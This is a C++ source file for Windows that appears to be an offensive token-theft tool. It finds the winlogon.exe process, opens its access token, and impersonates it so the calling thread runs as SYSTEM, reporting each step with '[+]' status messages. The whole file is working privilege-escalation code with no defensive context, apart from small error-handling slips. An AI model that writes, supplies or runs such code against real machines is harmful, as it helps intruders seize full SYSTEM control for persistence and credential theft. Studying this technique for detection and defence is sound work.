#include <Windows.h>
#include <tlhelp32.h>
#include <comdef.h>
#include <Lmcons.h>
#include <iostream>

#pragma comment(lib, "advapi32.lib")

// Hunt winlogon PID
int getTargetPID() {

    // Dataset
    const char* executable = "winlogon.exe";
    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(PROCESSENTRY32);
    int PID = 0;

    std::cout << "[+] Hunting for winlogon.exe PID...\n";
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(hSnapshot == INVALID_HANDLE_VALUE) {
        std::cout << "CreateToolhelp32Snapshot() error: " << GetLastError;
    }

    BOOL hResult = Process32First(hSnapshot, &pe);

    while (hResult) {

        _bstr_t b(pe.szExeFile);
        const char* exefile = b;

        if(strcmp(executable, exefile) == 0) {
            std::cout << "[+] Found! PID: " << pe.th32ProcessID << "\n";
            PID = pe.th32ProcessID;
            break;
        }

       hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return PID;
}

// Get username of current token
std::string getusername() {
    char username[UNLEN+1];
    DWORD username_len = UNLEN+1;
    GetUserNameA(username, &username_len);
    std::string username_s = username;
    return username_s;
}

// Impersonate SYSTEM account
int getSystem(int PID) {

    // Dataset
    HANDLE hToken;
    STARTUPINFOW siw = {};
    siw.cb = sizeof(siw);
    PROCESS_INFORMATION pi = {};

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, PID);

    if(hProcess == INVALID_HANDLE_VALUE) {
        std::cout << "[!] OpenProcess() failed. Code error: " << GetLastError();
        return -1;
    }

    std::cout << "[+] Process WinLogon.exe opened!\n";

    if(!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        std::cout << "[!] OpenProcessToken() failed. Code error: " << GetLastError();
        return -1;
    }

    std::cout << "[+] SYSTEM token extracted...\n";

    if(!ImpersonateLoggedOnUser(hToken)) {
        std::cout << "[!] ImpersonateLoggedOnUser() failed. Code error: " << GetLastError();
        return -1;
    }

    std::cout << "[+] Current thread running as: " << getusername().c_str() << "\n";

    CloseHandle(hProcess);
    CloseHandle(hToken);

    return 0;
}

int main() {
    int PID = getTargetPID();
    getSystem(PID);    
}